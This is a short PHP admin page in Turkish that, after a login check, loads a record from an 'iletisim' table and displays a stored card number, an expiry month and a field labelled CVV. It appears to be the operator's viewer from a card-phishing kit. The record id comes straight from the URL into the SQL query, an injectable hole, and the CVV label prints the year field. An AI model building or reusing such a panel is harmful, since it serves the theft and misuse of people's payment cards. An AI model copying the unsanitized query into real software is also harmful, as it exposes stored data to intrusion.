<?php
session_start();
header("Cache-control:private");

if($_SESSION['logged'] != "1") {
    header("location:giris.php");
    die(); }
	?>
	<?php
include("sifre.php");
?>
<?php 
include("baglan.php");
$id = $_GET["id"];
?>
<!DOCTYPE html>
<html lang="tr">
<head>
	<meta charset="UTF-8">
	<title>Yönetim Paneli</title>
	<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<style>
	.table {
		margin-bottom: 0px;
	}
	</style>
</head>
<body>
	<?php
	$sor=mysql_fetch_array(mysql_query("select * from iletisim where id='$id'"));
	$kartno=$sor["kartno"];
	$ay=$sor["ay"];
	$yil=$sor["yil"];
	?>
	<div class="container">
	<br>
	<div class="well">
	<h1>Kart Bilgileri</h1>
	<b>Kart Numarası :</b> <?php echo $kartno; ?><br>
	<b>Geçerlilik Tarihi :</b> <?php echo $ay; ?><br>
	<b>CVV :</b> <?php echo $yil; ?><br>
	<h3><a href="index.php"><< Geri dön</a></h3>
	</div>
	</div>
	<script src="js/bootstrap.min.js"></script>
</body>
</html>